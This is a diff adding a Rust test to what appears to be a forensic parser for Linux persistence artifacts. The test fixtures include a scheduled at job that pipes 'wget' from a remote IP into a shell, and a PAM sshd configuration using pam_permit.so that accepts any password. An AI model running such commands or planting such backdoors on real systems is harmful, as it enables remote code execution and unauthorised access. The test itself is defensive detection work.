@@ -96,3 +96,39 @@ fn entries_flags_and_times() {
     );
     assert!(preload[0].summary.contains("flags:"));
 }
+
+#[test]
+fn at_jobs_pam_and_sshd() {
+    let at = parse("var/spool/cron/atjobs/a0000201c79c28");
+    assert_eq!(
+        at[0].summary,
+        "at 2026-10-09T07:36Z as alice: wget -qO- http://203.0.113.40/u | sh (flags: download piped to a shell)"
+    );
+    assert_eq!(at[0].fields.get("Uid"), Some(&Value::UInt(1001)));
+    assert_eq!(at[0].fields.get("Queue"), Some(&Value::from("a")));
+
+    let pam = parse("etc/pam.d/sshd");
+    assert_eq!(
+        pam[0].fields.get("Module"),
+        Some(&Value::from("pam_permit.so"))
+    );
+    assert_eq!(
+        pam[0].fields.get("Flags"),
+        Some(&Value::from("PAM accepts any password"))
+    );
+
+    let sshd = parse("etc/ssh/sshd_config.d/99-tuning.conf");
+    assert_eq!(
+        sshd[3].fields.get("Match"),
+        Some(&Value::from("User backup"))
+    );
+    assert_eq!(
+        sshd[3].facets.process_command_line.as_deref(),
+        Some("/usr/local/bin/rrsync -ro /srv")
+    );
+
+    let init = parse("etc/init.d/sysupdate");
+    assert!(init
+        .iter()
+        .all(|r| r.facets.user_name.as_deref() == Some("root")));
+}
